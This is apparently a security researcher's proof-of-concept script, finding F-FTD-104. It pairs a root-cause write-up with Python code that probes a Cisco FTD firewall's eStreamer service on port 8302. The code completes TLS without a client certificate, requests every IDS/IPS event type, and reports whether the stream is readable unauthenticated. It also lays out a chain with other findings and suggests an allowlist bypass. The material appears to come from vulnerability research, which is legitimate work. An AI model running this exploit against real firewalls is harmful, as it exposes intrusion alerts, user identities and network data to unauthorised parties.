"""
F-FTD-104: sfestreamer (eStreamer) potential unauthenticated TLS access — port 8302
CONTROLLED ENVIRONMENT ONLY

Root cause analysis:
  sfestreamer (/usr/local/sf/bin/sfestreamer) is the Cisco FTD eStreamer daemon.
  eStreamer (Event Streaming) is a proprietary Cisco protocol for real-time IDS/IPS
  event delivery over TCP/TLS (default port 8302).

  Binary analysis (/tmp/ftd-sfestreamer):
    SSL_CTX_set_client_CA_list — sets acceptable client CA list
    SSL_get_peer_certificate — retrieves peer certificate (may be null)
    "SSL client certificate is not available?" — warning, NOT hard failure
    No SSL_VERIFY_FAIL_IF_NO_PEER_CERT string — suggests optional client cert
    "allowConnection" / "allowConnection FAIL for NULL addr." — IP-based allow-listing

  Authentication modes from protocol constants (in sfestreamer binary):
    Note: AUTH_TYPE_* constants (NONAUTH/AGENT/CAPTIVE/GUEST/FAILED/VPN) are
    eStreamer event fields classifying USER authentication (how a network user
    authenticated), NOT whether the eStreamer client must authenticate.
    Do NOT confuse with eStreamer protocol authentication.

  eStreamer protocol authentication (traditional model — FMC-managed):
    1. Client connects to eStreamer TCP port (default 8302)
    2. TLS handshake: server presents sfestreamer.pkcs12 cert
    3. Client presents FMC-signed client certificate OR connects without cert
    4. If no cert required: server checks source IP in enabled connections list
    5. eStreamer init exchange: client sends EVENT_STREAM_REQUEST message
    6. Server responds with event stream

  FTD standalone (FDM) mode concern:
    In FDM-managed FTD (standalone), eStreamer may start if:
      enablefile = /etc/sf/keys/sfestreamer.pkcs12 (this file must exist)
    In standalone mode with no FMC-managed client cert list, the allowConnection
    check may be trivially bypassed or default to allowing any connection.

    The estreamer.conf does NOT configure client cert paths or CA file — only
    server-side cert (via sfestreamer.pkcs12). If client cert verification
    defaults to optional (SSL_VERIFY_PEER without VERIFY_FAIL_IF_NO_PEER_CERT),
    any client can complete TLS and proceed to eStreamer protocol exchange.

  Event types exposed via eStreamer (from estreamer.conf services block):
    - Unified2 connection events, intrusion events, file events
    - User identity events (identity source, auth type)
    - IPS alert details including matched rule, payload context
    - Network map data

Severity: HIGH
  Network-accessible port 8302 on FTD management interface
  If client cert optional: unauthenticated read of full IDS/IPS event stream
  Confirms or enhances F-FTD-101 (eventing API unauth access)
  Impact: complete visibility into firewall decisions, blocked attacks, security posture

Confirmation needed (live VM):
  1. Is port 8302 open? `ss -tlnp | grep 8302`
  2. Does TLS handshake succeed without client cert?
     `openssl s_client -connect 127.0.0.1:8302 -no_ssl3`
  3. If TLS succeeds, does eStreamer protocol exchange return events?
     (This module implements the minimal eStreamer request)

Chain:
  F-FTD-104 (eStreamer unauth) — direct if 8302 exposed on management interface
  F-FTD-98 (AJP bypass) → pivot → F-FTD-101 (eventing servlet) → F-FTD-104

References:
  - estreamer.conf: port 8302, no client cert config
  - sfestreamer binary: SSL_get_peer_certificate, allowConnection, "SSL client cert not available?"
  - sfestreamer enablefile: /etc/sf/keys/sfestreamer.pkcs12 (must exist for process to start)
  - PM.conf: sfestreamer process config, requires_type mysql
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import socket
import ssl
import struct
import sys
from typing import Optional, Tuple


FINDING = "F-FTD-104"
LABEL = "sfestreamer eStreamer potential unauthenticated TLS access — port 8302"
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 8302

# eStreamer protocol constants
# Message header: 2 bytes type, 2 bytes flags, 4 bytes length
ESTREAMER_HDR_LEN = 8

# Message types (from Cisco eStreamer Integration Guide)
MSG_TYPE_EVENT_STREAM_REQUEST = 0x0001
MSG_TYPE_EVENT_STREAM_RESPONSE = 0x0002
MSG_TYPE_ERROR = 0x0000

# Event types bitmask
EVENT_TYPE_ALL = 0xFFFFFFFF
EVENT_TYPE_INTRUSION = 0x00000002
EVENT_TYPE_CONNECTION = 0x00000001


def build_estreamer_request(event_types: int = EVENT_TYPE_ALL) -> bytes:
    """
    Build minimal eStreamer Event Stream Request (type 0x0001).

    Format (from Cisco eStreamer Integration Guide):
      Header: 2B type | 2B flags | 4B length
      Body:   4B event types bitmask | 4B start timestamp (0=live)
    """
    msg_type = MSG_TYPE_EVENT_STREAM_REQUEST
    flags = 0x0000
    body = struct.pack('>II', event_types, 0)  # event_types, timestamp=0
    length = len(body)
    header = struct.pack('>HHI', msg_type, flags, length)
    return header + body


def parse_estreamer_response(data: bytes) -> dict:
    """Parse eStreamer message header and classify response."""
    if len(data) < ESTREAMER_HDR_LEN:
        return {'type': None, 'error': 'truncated'}
    msg_type, flags, length = struct.unpack('>HHI', data[:8])
    body = data[8:8+length] if len(data) >= 8 + length else data[8:]
    result = {
        'type': msg_type,
        'flags': flags,
        'length': length,
        'body': body,
        'body_hex': body[:32].hex() if body else ''
    }
    if msg_type == MSG_TYPE_ERROR:
        result['description'] = 'ERROR response'
    elif msg_type == MSG_TYPE_EVENT_STREAM_RESPONSE:
        result['description'] = 'EVENT_STREAM_RESPONSE'
    elif msg_type == 0x0003:
        result['description'] = 'EVENT_STREAM_CLOSE'
    else:
        result['description'] = f'UNKNOWN type=0x{msg_type:04x}'
    return result


def try_tls_connect(host: str, port: int, timeout: int = 10,
                    client_cert: Optional[str] = None,
                    client_key: Optional[str] = None) -> Tuple[bool, Optional[ssl.SSLSocket], str]:
    """
    Attempt TLS connection to eStreamer, optionally with a client cert.

    Returns: (success, ssl_socket_or_none, status_message)
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE  # Don't verify server cert (self-signed)

    if client_cert and client_key:
        try:
            ctx.load_cert_chain(certfile=client_cert, keyfile=client_key)
            print(f"    [+] Client cert loaded: {client_cert}")
        except Exception as e:
            return False, None, f"Failed to load client cert: {e}"

    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(timeout)
        raw.connect((host, port))
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        cipher = ssock.cipher()
        peer_cert = ssock.getpeercert(binary_form=True)
        status = f"TLS OK cipher={cipher[0] if cipher else 'none'}"
        if peer_cert:
            status += f" server_cert={len(peer_cert)}B"
        return True, ssock, status
    except ssl.SSLError as e:
        return False, None, f"TLS error: {e}"
    except Exception as e:
        return False, None, f"Connection error: {e}"


def probe_estreamer(host: str, port: int, timeout: int = 10,
                    client_cert: Optional[str] = None,
                    client_key: Optional[str] = None) -> dict:
    """Full eStreamer probe: TLS + protocol exchange."""
    result = {
        'host': host,
        'port': port,
        'port_open': False,
        'tls_success': False,
        'client_cert_required': None,
        'protocol_response': None,
        'error': None
    }

    # Quick port check
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        result['port_open'] = True
    except Exception as e:
        result['error'] = f"Port {port} not reachable: {e}"
        return result

    print(f"[+] Port {port} open on {host}")

    # Attempt 1: TLS without client cert
    print(f"\n[1] TLS without client certificate...")
    ok, ssock, msg = try_tls_connect(host, port, timeout)
    if ok:
        print(f"    [+] TLS ACCEPTED without client cert: {msg}")
        result['tls_success'] = True
        result['client_cert_required'] = False

        # Attempt eStreamer protocol exchange
        print(f"\n[2] eStreamer EVENT_STREAM_REQUEST (no auth, all event types)...")
        try:
            req = build_estreamer_request(EVENT_TYPE_ALL)
            ssock.sendall(req)
            resp_data = b''
            ssock.settimeout(5)
            try:
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    resp_data += chunk
                    if len(resp_data) >= 8:
                        break
            except socket.timeout:
                pass
            if resp_data:
                parsed = parse_estreamer_response(resp_data)
                result['protocol_response'] = parsed
                print(f"    [+] eStreamer response: {parsed['description']}")
                print(f"        type=0x{parsed['type']:04x} flags=0x{parsed['flags']:04x} len={parsed['length']}")
                if parsed['body_hex']:
                    print(f"        body={parsed['body_hex']}")
            else:
                print(f"    [-] No eStreamer response (timeout)")
        except Exception as e:
            print(f"    [-] eStreamer protocol error: {e}")
        finally:
            ssock.close()
    else:
        print(f"    [-] TLS REJECTED: {msg}")
        result['client_cert_required'] = True

        if client_cert:
            # Retry with provided client cert
            print(f"\n[2] TLS with client cert {client_cert}...")
            ok, ssock, msg = try_tls_connect(host, port, timeout, client_cert, client_key)
            if ok:
                print(f"    [+] TLS with client cert ACCEPTED: {msg}")
                result['tls_success'] = True
                ssock.close()
            else:
                print(f"    [-] TLS with client cert failed: {msg}")

    return result


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', nargs='?', default=DEFAULT_HOST,
                    help=f'Target host (default: {DEFAULT_HOST})')
    ap.add_argument('--port', type=int, default=DEFAULT_PORT,
                    help=f'eStreamer port (default: {DEFAULT_PORT})')
    ap.add_argument('--client-cert', default=None,
                    help='Client certificate PEM file (optional)')
    ap.add_argument('--client-key', default=None,
                    help='Client private key PEM file (optional)')
    ap.add_argument('--timeout', type=int, default=10)
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target: {args.host}:{args.port}')
    print('[!] CONTROLLED ENVIRONMENT ONLY')
    print('[!] eStreamer streams full IDS/IPS event feed — do not run against production')
    print()

    result = probe_estreamer(args.host, args.port, args.timeout,
                             args.client_cert, args.client_key)

    print()
    print(f'[*] {FINDING}: Summary')
    print(f'    Port open: {result["port_open"]}')
    print(f'    TLS without cert: {result["tls_success"]}')
    print(f'    Client cert required: {result["client_cert_required"]}')

    if result['tls_success'] and result['client_cert_required'] is False:
        print()
        print(f'[!] FINDING CONFIRMED: eStreamer accepts TLS without client certificate')
        print(f'    Impact: Full IDS/IPS event stream accessible without authentication')
        print(f'    Includes: intrusion alerts, connection events, file events, user identity')
        print(f'    Chain: F-FTD-104 (direct 8302) or F-FTD-98→F-FTD-101→F-FTD-104')
        print()
        print(f'    Manual verification:')
        print(f'      openssl s_client -connect {args.host}:{args.port} -no_ssl3')
        print(f'    If TLS succeeds, eStreamer events follow the TLS handshake.')
    elif result['client_cert_required']:
        print()
        print(f'[.] Client cert required — need FMC-signed cert to access eStreamer.')
        print(f'    If FTD cert at /etc/sf/keys/sfestreamer.pkcs12, client must present')
        print(f'    a corresponding trusted cert.')
        print()
        print(f'    Alternative: check if IP allowlist in estreamer.conf bypasses cert check.')


if __name__ == '__main__':
    main()
